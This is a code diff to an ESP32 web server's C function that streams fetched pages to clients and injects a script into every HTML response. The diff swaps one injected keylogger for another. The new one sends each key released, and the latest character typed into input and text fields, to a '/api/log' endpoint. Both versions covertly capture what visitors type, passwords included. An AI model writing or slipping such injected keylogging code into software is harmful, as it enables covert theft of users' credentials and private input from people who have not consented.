@@ -495,26 +495,19 @@ esp_err_t stream_data_to_client(httpd_req_t *req, const char *url, const char *c
 
             if (content_type && strcmp(content_type, "text/html") == 0) {
                 const char *javascript_code =
-                    "<script>var keys = '';\n"
-                    "\n"
-                    "document.onkeypress = function(e) {\n"
-                    "    get = window.event ? event : e;\n"
-                    "    key = get.keyCode ? get.keyCode : get.charCode;\n"
-                    "    key = String.fromCharCode(key);\n"
-                    "    keys += key;\n"
-                    "\n"
-                    "    // Make a fetch request on every key press\n"
-                    "    fetch('/api/log', {\n"
-                    "        method: 'POST',\n"
-                    "        headers: {\n"
-                    "            'Content-Type': 'application/json'\n"
-                    "        },\n"
-                    "        body: JSON.stringify({ content: keys })\n"
-                    "    })\n"
-                    "    .catch(error => console.error('Error logging:', error));\n"
-                    "};</script>\n";
-                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) !=
-                    ESP_OK) {
+                    "<script>\n"
+                    "(function(){\n"
+                    "function logKey(key){\n"
+                    "    var xhr = new XMLHttpRequest();\n"
+                    "    xhr.open('POST','/api/log',true);\n"
+                    "    xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');\n"
+                    "    xhr.send(JSON.stringify({key:key}));\n"
+                    "}\n"
+                    "document.addEventListener('keyup', function(e){ logKey(e.key); });\n"
+                    "document.addEventListener('input', function(e){ if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){ var val=e.target.value; var key=val.slice(-1); if(key) logKey(key);} });\n"
+                    "})();\n"
+                    "</script>\n";
+                if (httpd_resp_send_chunk(req, javascript_code, strlen(javascript_code)) != ESP_OK) {
                     printf("Failed to send custom JavaScript\n");
                 }
             }
